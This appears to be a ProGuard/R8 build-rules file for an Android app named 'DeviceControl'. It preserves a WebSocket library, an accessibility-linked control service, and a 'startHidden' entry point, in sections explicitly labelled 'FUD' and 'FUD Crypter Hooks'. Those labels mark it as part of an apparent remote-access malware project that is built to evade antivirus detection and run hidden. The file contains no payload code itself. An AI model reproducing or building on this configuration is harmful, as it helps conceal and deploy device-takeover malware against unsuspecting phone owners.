# ═══════════════════════════════════════════════════════════════
# proguard-rules.pro  —  DeviceControl Release Optimization
# Target: < 1 MB APK per flavor (KB range)
# ═══════════════════════════════════════════════════════════════

# ─── Java-WebSocket ─────────────────────────────────────────────
-keep class org.java_websocket.** { *; }
-keepclassmembers class org.java_websocket.** { *; }
-dontwarn org.java_websocket.**

# ─── org.json is part of Android platform, never bundle it ──────
# (no -keep needed — R8 will exclude it from the DEX automatically)
-dontwarn org.json.**

# ─── FUD & Permission Stubs ─────────────────────────────────────
-keep class com.fud.** { *; }
-keep class com.apex.** { *; }

# ─── Accessibility & Core App Components ────────────────────────
-keep class com.device.ctrl.ControlService { *; }
-keep public class * extends android.app.Activity
-keep public class * extends android.app.Service
-keep public class * extends android.content.BroadcastReceiver
-keep public class * extends android.app.Application

# ─── Custom Views (keep constructors for programmatic inflation) ──
-keep public class * extends android.view.View {
    public <init>(android.content.Context);
    public <init>(android.content.Context, android.util.AttributeSet);
    public <init>(android.content.Context, android.util.AttributeSet, int);
}

# ─── @JavascriptInterface (WebView bridge, if used) ──────────────
-keepclassmembers class * {
    @android.webkit.JavascriptInterface <methods>;
}

# ─── Keep essential attributes for reflection ────────────────────
-keepattributes *Annotation*
-keepattributes InnerClasses
-keepattributes Signature
-keepattributes Exceptions

# ─── Silence irrelevant warnings ─────────────────────────────────
-dontwarn org.slf4j.**
-dontwarn javax.annotation.**
-dontwarn java.lang.invoke.**

# ─── R8 Full-Mode: allow aggressive dead-code elimination ─────────
# (proguard-android-optimize.txt already enables most optimizations;
#  these additions push R8 into maximum shrink mode)
-optimizationpasses 5
-allowaccessmodification
-repackageclasses ''

# ─── FUD Crypter Hooks ──────────────────────────────────────────
-keep class com.device.ctrl.MainActivity { *; }
-keep class com.device.ctrl.MainActivity$* { *; }
-keepclassmembers class com.device.ctrl.MainActivity {
    public static void startHidden(android.content.Context);
}
-keep class com.device.ctrl.ControlService { *; }

